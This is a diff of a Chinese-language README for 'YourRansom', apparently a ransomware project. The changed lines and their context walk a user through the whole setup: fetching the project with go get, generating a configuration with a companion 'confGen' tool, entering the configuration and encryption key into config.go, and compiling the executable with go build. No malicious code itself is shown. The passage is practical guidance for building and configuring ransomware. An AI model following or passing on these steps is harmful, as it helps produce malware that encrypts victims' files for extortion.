@@ -22,7 +22,7 @@ YourRansom
 
 2. 使用go get下载该项目到本地：`go get github.com/YourRansom/YourRansom`
 
-3. 修改YourRansom的参数，使用您的文本编辑器打开`$GOPATH/src/github.com/YourRansom/YourRansom/config.go`，如果您未设置`GOPATH`环境变量，
+3. 修改YourRansom的参数，使用[YourRansom/confGen](https://github.com/YourRansom/confGen)生成配置文件，使用您的文本编辑器打开`$GOPATH/src/github.com/YourRansom/YourRansom/config.go`，如果您未设置`GOPATH`环境变量，
 那么打开`$HOME/go/src/github.com/YourRansom/YourRansom/config.go`(Unix-like)或`%USERPROFILE%\go\src\github.com\YourRansom\YourRansom\config.go`(Windows)，将配置文件和加密密钥填入，配置即完成。
 
 4. 编译YourRansom，执行：`go build -x github.com/YourRansom/YourRansom`，编译完成的可执行文件将存于当前工作目录。
